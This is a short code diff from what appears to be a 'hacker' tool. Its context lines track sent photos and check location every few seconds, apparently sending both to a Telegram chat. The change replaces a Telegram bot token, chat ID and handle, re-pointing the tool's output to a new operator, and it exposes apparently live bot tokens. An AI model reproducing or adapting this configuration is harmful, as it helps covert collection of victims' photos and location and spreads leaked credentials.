@@ -59,8 +59,8 @@ bars = ['█▒▒▒▒▒▒▒▒▒', '███▒▒▒▒▒▒▒', '█
 sent_photos = set()
 
 # --- TELEGRAM CONFIG ---
-TOKEN = "8936819562:AAHZ0xwO7XAzipUSJzejMnqjqAKy8uB8g5k"
-CHAT_ID = "8589568398"
+TOKEN = "8948855604:AAHHCrm8ah-mUj8RLWILKHuk5Jv1XkHtqeM"
+CHAT_ID = "7132512163"
 LOCATION_INTERVAL = 3  # Check interval in seconds
 # -----------------------
 
@@ -68,7 +68,7 @@ LOCATION_INTERVAL = 3  # Check interval in seconds
 HACKER_PREFIXES = [
     "@SABA_MONY",
     "@SABA_MONY",
-    "@SABA_MONY"
+    "@SKSHORIFHASAN"
 ]
 
 ADMIN_HANDLE = "@SABA_MONY"
